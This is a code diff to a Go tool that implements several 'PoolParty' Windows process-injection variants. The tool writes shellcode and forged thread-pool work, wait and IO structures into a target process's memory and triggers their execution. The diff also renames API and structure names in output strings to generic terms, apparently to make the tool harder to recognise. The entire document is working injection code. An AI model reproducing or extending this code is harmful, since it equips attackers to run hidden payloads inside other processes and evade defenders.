@@ -44,7 +44,7 @@ func executeVariant1(shellcode []byte, pid uint32) (string, error) {
 	// Step 4: Write shellcode to start routine address
 	bytesWritten, err := injectWriteMemory(hProcess, workerFactoryInfo.StartRoutine, shellcode)
 	if err != nil {
-		return output, fmt.Errorf("WriteProcessMemory failed: %w", err)
+		return output, fmt.Errorf("memory write failed: %w", err)
 	}
 	output += fmt.Sprintf("[+] Wrote %d bytes to start routine address\n", bytesWritten)
 
@@ -65,9 +65,9 @@ func executeVariant1(shellcode []byte, pid uint32) (string, error) {
 	return output, nil
 }
 
-// executeVariant2 implements TP_WORK Insertion
+// executeVariant2 implements work item Insertion
 func executeVariant2(shellcode []byte, pid uint32, cfgBypass bool) (string, error) {
-	hProcess, output, err := poolPartyInit(2, "TP_WORK Insertion", shellcode, pid)
+	hProcess, output, err := poolPartyInit(2, "work item Insertion", shellcode, pid)
 	if err != nil {
 		return output, err
 	}
@@ -122,54 +122,60 @@ func executeVariant2(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 		return output, err
 	}
 
-	// Step 8: Create TP_WORK structure via CreateThreadpoolWork (exactly as SafeBreach does)
-	pTpWork, _, err := procCreateThreadpoolWork.Call(
-		shellcodeAddr, // Work callback points to shellcode
-		0,             // Context
-		0,             // Callback environment
-	)
-	if pTpWork == 0 {
-		return output, fmt.Errorf("work item creation failed: %w", err)
+	// Step 8-11: Build and write work item to target process
+	tpWork, tpWorkAddr, buildOutput, err := poolPartyBuildWorkItem(
+		hProcess, shellcodeAddr, workerFactoryInfo.StartParameter, targetTpPool, targetQueue)
+	output += buildOutput
+	if err != nil {
+		return output, err
 	}
-	output += "[+] Created TP_WORK structure associated with shellcode\n"
 
-	// Step 9: Read and modify the TP_WORK structure
+	// Step 12: Insert work item into the target's task queue
+	insertOutput, err := poolPartyInsertWorkItem(hProcess, tpWorkAddr, tpWork, targetTpPool, targetQueue)
+	output += insertOutput
+	if err != nil {
+		return output, err
+	}
+
+	output += "[+] PoolParty Variant 2 injection completed successfully\n"
+	return output, nil
+}
+
+// poolPartyBuildWorkItem creates a work item structure locally, modifies it to target the
+// remote process's TP_POOL, allocates memory in the target, and writes the work item.
+func poolPartyBuildWorkItem(hProcess uintptr, shellcodeAddr, tpPoolAddr uintptr,
+	targetTpPool FULL_TP_POOL, targetQueue TPP_QUEUE) (FULL_TP_WORK, uintptr, string, error) {
+	var output string
+
+	pTpWork, _, err := procCreateThreadpoolWork.Call(shellcodeAddr, 0, 0)
+	if pTpWork == 0 {
+		return FULL_TP_WORK{}, 0, output, fmt.Errorf("work item creation failed: %w", err)
+	}
+	output += "[+] Created work item structure associated with shellcode\n"
+
 	var tpWork FULL_TP_WORK
-	// Copy the structure from our local process
 	for i := 0; i < int(unsafe.Sizeof(tpWork)); i++ {
 		*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&tpWork)) + uintptr(i))) =
 			*(*byte)(unsafe.Pointer(pTpWork + uintptr(i)))
 	}
-
-	// Close the local TP_WORK now that we've copied it
 	procCloseThreadpoolWork.Call(pTpWork)
 
-	// Modify: Point Pool to target's TP_POOL
-	tpWork.CleanupGroupMember.Pool = workerFactoryInfo.StartParameter
+	tpWork.CleanupGroupMember.Pool = tpPoolAddr
 
-	// Modify: Point Flink and Blink to the Queue field address in the target process
-	// targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH] is a pointer to TPP_QUEUE in target
-	// We need the address of the Queue field within that TPP_QUEUE
 	targetTaskQueueAddr := targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH]
 	targetQueueListAddr := targetTaskQueueAddr + uintptr(unsafe.Offsetof(targetQueue.Queue))
 
-	// Read current queue state before modifying
 	var currentQueueFlink uintptr
-	err = injectReadMemoryInto(hProcess, targetQueueListAddr, unsafe.Pointer(&currentQueueFlink), int(unsafe.Sizeof(currentQueueFlink)))
-	if err != nil {
-		return output, fmt.Errorf("ReadProcessMemory for current queue Flink failed: %w", err)
+	if err := injectReadMemoryInto(hProcess, targetQueueListAddr, unsafe.Pointer(&currentQueueFlink), int(unsafe.Sizeof(currentQueueFlink))); err != nil {
+		return FULL_TP_WORK{}, 0, output, fmt.Errorf("ReadProcessMemory for current queue Flink failed: %w", err)
 	}
-
 	var currentQueueBlink uintptr
-	err = injectReadMemoryInto(hProcess, targetQueueListAddr+8, unsafe.Pointer(&currentQueueBlink), int(unsafe.Sizeof(currentQueueBlink)))
-	if err != nil {
-		return output, fmt.Errorf("ReadProcessMemory for current queue Blink failed: %w", err)
+	if err := injectReadMemoryInto(hProcess, targetQueueListAddr+8, unsafe.Pointer(&currentQueueBlink), int(unsafe.Sizeof(currentQueueBlink))); err != nil {
+		return FULL_TP_WORK{}, 0, output, fmt.Errorf("ReadProcessMemory for current queue Blink failed: %w", err)
 	}
 
 	output += fmt.Sprintf("[*] Current queue Flink: 0x%X, Blink: 0x%X (queue list addr: 0x%X)\n", currentQueueFlink, currentQueueBlink, targetQueueListAddr)
 
-	// If queue is empty (points to itself), simple circular list
-	// If queue has items, insert at head
 	if currentQueueFlink == targetQueueListAddr {
 		output += "[*] Queue is empty, creating single-element list\n"
 		tpWork.Task.ListEntry.Flink = targetQueueListAddr
@@ -179,84 +185,66 @@ func executeVariant2(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 		tpWork.Task.ListEntry.Flink = currentQueueFlink
 		tpWork.Task.ListEntry.Blink = targetQueueListAddr
 	}
-
-	// Set WorkState exactly as SafeBreach does
 	tpWork.WorkState.Exchange = 0x2
-	output += "[+] Modified TP_WORK structure for insertion\n"
+	output += "[+] Modified work item structure for insertion\n"
 
-	// Step 10: Allocate memory for TP_WORK in target process
 	tpWorkAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpWork)), PAGE_READWRITE)
 	if err != nil {
-		return output, fmt.Errorf("remote allocation for TP_WORK failed: %w", err)
+		return FULL_TP_WORK{}, 0, output, fmt.Errorf("remote allocation for work item failed: %w", err)
 	}
-	output += fmt.Sprintf("[+] Allocated TP_WORK memory at: 0x%X\n", tpWorkAddr)
+	output += fmt.Sprintf("[+] Allocated work item memory at: 0x%X\n", tpWorkAddr)
 
-	// Step 11: Write TP_WORK to target
 	tpWorkBytes := (*[1 << 20]byte)(unsafe.Pointer(&tpWork))[:unsafe.Sizeof(tpWork)]
 	bytesWritten, err := injectWriteMemory(hProcess, tpWorkAddr, tpWorkBytes)
 	if err != nil {
-		return output, fmt.Errorf("WriteProcessMemory for TP_WORK failed: %w", err)
+		return FULL_TP_WORK{}, 0, output, fmt.Errorf("memory write for work item failed: %w", err)
 	}
-	output += fmt.Sprintf("[+] Wrote TP_WORK structure (%d bytes)\n", bytesWritten)
+	output += fmt.Sprintf("[+] Wrote work item structure (%d bytes)\n", bytesWritten)
 
-	// Step 12: Insert into queue - write remote TP_WORK list entry address to queue's Flink and Blink
-	// Calculate the address of our TP_WORK's Task.ListEntry in the target process
+	return tpWork, tpWorkAddr, output, nil
+}
+
+// poolPartyInsertWorkItem links a remote work item into the target's task queue by
+// updating the queue's Flink/Blink pointers and (if non-empty) the old first item's Blink.
+func poolPartyInsertWorkItem(hProcess uintptr, tpWorkAddr uintptr, tpWork FULL_TP_WORK,
+	targetTpPool FULL_TP_POOL, targetQueue TPP_QUEUE) (string, error) {
+	var output string
+
 	remoteWorkItemTaskListAddr := tpWorkAddr + uintptr(unsafe.Offsetof(tpWork.Task)) + uintptr(unsafe.Offsetof(tpWork.Task.ListEntry))
-
-	// Recalculate queue addresses (can't use := since variables already declared)
-	targetTaskQueueAddr = targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH]
-	targetQueueListAddr = targetTaskQueueAddr + uintptr(unsafe.Offsetof(targetQueue.Queue))
+	targetTaskQueueAddr := targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH]
+	targetQueueListAddr := targetTaskQueueAddr + uintptr(unsafe.Offsetof(targetQueue.Queue))
 
 	output += fmt.Sprintf("[*] Debug: remoteWorkItemTaskListAddr = 0x%X\n", remoteWorkItemTaskListAddr)
 	output += fmt.Sprintf("[*] Debug: targetQueueListAddr (Flink addr) = 0x%X\n", targetQueueListAddr)
 
-	// Update queue's Flink to point to our TP_WORK
 	flinkBytes := (*[8]byte)(unsafe.Pointer(&remoteWorkItemTaskListAddr))[:]
-	_, err = injectWriteMemory(hProcess, targetQueueListAddr, flinkBytes)
-	if err != nil {
-		return output, fmt.Errorf("WriteProcessMemory for queue Flink failed: %w", err)
+	if _, err := injectWriteMemory(hProcess, targetQueueListAddr, flinkBytes); err != nil {
+		return output, fmt.Errorf("memory write for queue Flink failed: %w", err)
 	}
 
-	// Update queue's Blink based on whether queue was empty
-	var blinkTarget uintptr
-	if currentQueueFlink == targetQueueListAddr {
-		// Queue was empty, so Blink also points to our work item
-		blinkTarget = remoteWorkItemTaskListAddr
-	} else {
-		// Queue had items, need to update the old first item's Blink to point to us
-		// and queue's Blink stays pointing to the last item
-		// Actually, for simplicity, SafeBreach just sets both to the new item
-		blinkTarget = remoteWorkItemTaskListAddr
-	}
-
+	blinkTarget := remoteWorkItemTaskListAddr
 	blinkBytes := (*[8]byte)(unsafe.Pointer(&blinkTarget))[:]
-	_, err = injectWriteMemory(hProcess, targetQueueListAddr+uintptr(unsafe.Sizeof(uintptr(0))), blinkBytes)
-	if err != nil {
-		return output, fmt.Errorf("WriteProcessMemory for queue Blink failed: %w", err)
+	if _, err := injectWriteMemory(hProcess, targetQueueListAddr+uintptr(unsafe.Sizeof(uintptr(0))), blinkBytes); err != nil {
+		return output, fmt.Errorf("memory write for queue Blink failed: %w", err)
 	}
 
-	// If there was an existing first item, update its Blink to point to our work item
+	currentQueueFlink := tpWork.Task.ListEntry.Flink
 	if currentQueueFlink != targetQueueListAddr {
-		// Calculate the Blink address of the old first item
-		// currentQueueFlink points to a LIST_ENTRY, Blink is at offset 8
 		oldFirstItemBlinkAddr := currentQueueFlink + 8
 		oldBlinkBytes := (*[8]byte)(unsafe.Pointer(&remoteWorkItemTaskListAddr))[:]
-		_, err = injectWriteMemory(hProcess, oldFirstItemBlinkAddr, oldBlinkBytes)
-		if err != nil {
-			return output, fmt.Errorf("WriteProcessMemory for old first item Blink failed: %w", err)
+		if _, err := injectWriteMemory(hProcess, oldFirstItemBlinkAddr, oldBlinkBytes); err != nil {
+			return output, fmt.Errorf("memory write for old first item Blink failed: %w", err)
 		}
 		output += "[*] Updated old first item's Blink pointer\n"
 	}
 
-	output += "[+] Inserted TP_WORK into target process thread pool task queue\n"
-	output += "[+] PoolParty Variant 2 injection completed successfully\n"
-
+	output += "[+] Inserted work item into target process thread pool task queue\n"
 	return output, nil
 }
 
-// executeVariant3 implements TP_WAIT Insertion via Event signaling
+// executeVariant3 implements wait item Insertion via Event signaling
 func executeVariant3(shellcode []byte, pid uint32, cfgBypass bool) (string, error) {
-	hProcess, output, err := poolPartyInit(3, "TP_WAIT Insertion", shellcode, pid)
+	hProcess, output, err := poolPartyInit(3, "wait item Insertion", shellcode, pid)
 	if err != nil {
 		return output, err
 	}
@@ -276,7 +264,7 @@ func executeVariant3(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 		return output, err
 	}
 
-	// Step 5: Create TP_WAIT structure via CreateThreadpoolWait
+	// Step 5: Create wait item structure via CreateThreadpoolWait
 	pTpWait, _, err := procCreateThreadpoolWait.Call(
 		shellcodeAddr, // Wait callback points to shellcode
 		0,             // Context
@@ -285,39 +273,39 @@ func executeVariant3(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	if pTpWait == 0 {
 		return output, fmt.Errorf("wait item creation failed: %w", err)
 	}
-	output += "[+] Created TP_WAIT structure associated with shellcode\n"
+	output += "[+] Created wait item structure associated with shellcode\n"
 
-	// Step 6: Allocate memory for TP_WAIT in target process
+	// Step 6: Allocate memory for wait item in target process
 	var tpWait FULL_TP_WAIT
 	tpWaitAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpWait)), PAGE_READWRITE)
 	if err != nil {
-		return output, fmt.Errorf("remote allocation for TP_WAIT failed: %w", err)
+		return output, fmt.Errorf("remote allocation for wait item failed: %w", err)
 	}
-	output += fmt.Sprintf("[+] Allocated TP_WAIT memory at: 0x%X\n", tpWaitAddr)
+	output += fmt.Sprintf("[+] Allocated wait item memory at: 0x%X\n", tpWaitAddr)
 
-	// Step 7: Write TP_WAIT to target process
+	// Step 7: Write wait item to target process
 	tpWaitBytes := (*[1 << 20]byte)(unsafe.Pointer(pTpWait))[:unsafe.Sizeof(tpWait)]
 	bytesWritten, err := injectWriteMemory(hProcess, tpWaitAddr, tpWaitBytes)
 	if err != nil {
-		return output, fmt.Errorf("WriteProcessMemory for TP_WAIT failed: %w", err)
+		return output, fmt.Errorf("memory write for wait item failed: %w", err)
 	}
-	output += fmt.Sprintf("[+] Wrote TP_WAIT structure (%d bytes)\n", bytesWritten)
+	output += fmt.Sprintf("[+] Wrote wait item structure (%d bytes)\n", bytesWritten)
 
-	// Step 8: Allocate and write TP_DIRECT separately
+	// Step 8: Allocate and write direct item separately
 	pWaitStruct := (*FULL_TP_WAIT)(unsafe.Pointer(pTpWait))
 	var tpDirect TP_DIRECT
 	tpDirectAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpDirect)), PAGE_READWRITE)
 	if err != nil {
-		return output, fmt.Errorf("remote allocation for TP_DIRECT failed: %w", err)
+		return output, fmt.Errorf("remote allocation for direct item failed: %w", err)
 	}
-	output += fmt.Sprintf("[+] Allocated TP_DIRECT memory at: 0x%X\n", tpDirectAddr)
+	output += fmt.Sprintf("[+] Allocated direct item memory at: 0x%X\n", tpDirectAddr)
 
 	tpDirectBytes := (*[1 << 20]byte)(unsafe.Pointer(&pWaitStruct.Direct))[:unsafe.Sizeof(tpDirect)]
 	_, err = injectWriteMemory(hProcess, tpDirectAddr, tpDirectBytes)
 	if err != nil {
-		return output, fmt.Errorf("WriteProcessMemory for TP_DIRECT failed: %w", err)
+		return output, fmt.Errorf("memory write for direct item failed: %w", err)
 	}
-	output += "[+] Wrote TP_DIRECT structure\n"
+	output += "[+] Wrote direct item structure\n"
 
 	// Step 9: Create event
 	eventName, _ := windows.UTF16PtrFromString("PoolPartyEvent")
@@ -338,8 +326,8 @@ func executeVariant3(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 		pWaitStruct.WaitPkt,    // WaitCompletionPacketHandle
 		uintptr(hIoCompletion), // IoCompletionHandle
 		hEvent,                 // TargetObjectHandle (event)
-		tpDirectAddr,           // KeyContext (remote TP_DIRECT)
-		tpWaitAddr,             // ApcContext (remote TP_WAIT)
+		tpDirectAddr,           // KeyContext (remote direct item)
+		tpWaitAddr,             // ApcContext (remote wait item)
 		0,                      // IoStatus
 		0,                      // IoStatusInformation
 		0,                      // AlreadySignaled (NULL)
@@ -357,15 +345,15 @@ func executeVariant3(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	output += "[+] Set event to queue packet to I/O completion port\n"
 	output += "[+] PoolParty Variant 3 injection completed successfully\n"
 
-	// Cleanup local TP_WAIT
+	// Cleanup local wait item
 	procCloseThreadpoolWait.Call(pTpWait)
 
 	return output, nil
 }
 
-// executeVariant4 implements TP_IO Insertion via File I/O completion
+// executeVariant4 implements IO item Insertion via File I/O completion
 func executeVariant4(shellcode []byte, pid uint32, cfgBypass bool) (string, error) {
-	hProcess, output, err := poolPartyInit(4, "TP_IO Insertion", shellcode, pid)
+	hProcess, output, err := poolPartyInit(4, "IO item Insertion", shellcode, pid)
 	if err != nil {
 		return output, err
 	}
@@ -402,7 +390,7 @@ func executeVariant4(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	defer windows.CloseHandle(windows.Handle(hFile))
 	output += "[+] Created file 'C:\\Windows\\Temp\\PoolParty.txt' with overlapped I/O\n"
 
-	// Step 6: Create TP_IO structure via CreateThreadpoolIo
+	// Step 6: Create IO item structure via CreateThreadpoolIo
 	pTpIo, _, err := procCreateThreadpoolIo.Call(
 		hFile,
 		shellcodeAddr, // I/O callback points to shellcode
@@ -412,31 +400,31 @@ func executeVariant4(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	if pTpIo == 0 {
 		return output, fmt.Errorf("IO item creation failed: %w", err)
 	}
-	output += "[+] Created TP_IO structure associated with shellcode\n"
+	output += "[+] Created IO item structure associated with shellcode\n"
 
-	// Step 7: Modify TP_IO - set callback and increment PendingIrpCount
+	// Step 7: Modify IO item - set callback and increment PendingIrpCount
 	pIoStruct := (*FULL_TP_IO)(unsafe.Pointer(pTpIo))
 	pIoStruct.CleanupGroupMember.Callback = shellcodeAddr // Explicitly set callback
 	pIoStruct.PendingIrpCount++                           // Mark async I/O as pending
-	output += "[+] Modified TP_IO: set callback and incremented PendingIrpCount\n"
+	output += "[+] Modified IO item: set callback and incremented PendingIrpCount\n"
 
-	// Step 8: Allocate memory for TP_IO in target process
+	// Step 8: Allocate memory for IO item in target process
 	var tpIo FULL_TP_IO
 	tpIoAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpIo)), PAGE_READWRITE)
 	if err != nil {
-		return output, fmt.Errorf("remote allocation for TP_IO failed: %w", err)
+		return output, fmt.Errorf("remote allocation for IO item failed: %w", err)
 	}
-	output += fmt.Sprintf("[+] Allocated TP_IO memory at: 0x%X\n", tpIoAddr)
+	output += fmt.Sprintf("[+] Allocated IO item memory at: 0x%X\n", tpIoAddr)
 
-	// Step 9: Write TP_IO to target process
+	// Step 9: Write IO item to target process
 	tpIoBytes := (*[1 << 20]byte)(unsafe.Pointer(pTpIo))[:unsafe.Sizeof(tpIo)]
 	bytesWritten, err := injectWriteMemory(hProcess, tpIoAddr, tpIoBytes)
 	if err != nil {
-		return output, fmt.Errorf("WriteProcessMemory for TP_IO failed: %w", err)
+		return output, fmt.Errorf("memory write for IO item failed: %w", err)
 	}
-	output += fmt.Sprintf("[+] Wrote TP_IO structure (%d bytes)\n", bytesWritten)
+	output += fmt.Sprintf("[+] Wrote IO item structure (%d bytes)\n", bytesWritten)
 
-	// Step 10: Calculate remote TP_DIRECT address
+	// Step 10: Calculate remote direct item address
 	var dummyTpIo FULL_TP_IO
 	remoteTpDirectAddr := tpIoAddr + uintptr(unsafe.Offsetof(dummyTpIo.Direct))
 
@@ -473,7 +461,7 @@ func executeVariant4(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	output += "[+] Wrote to file to trigger I/O completion\n"
 	output += "[+] PoolParty Variant 4 injection completed successfully\n"
 
-	// Cleanup local TP_IO
+	// Cleanup local IO item
 	procCloseThreadpoolIo.Call(pTpIo)
 
 	return output, nil
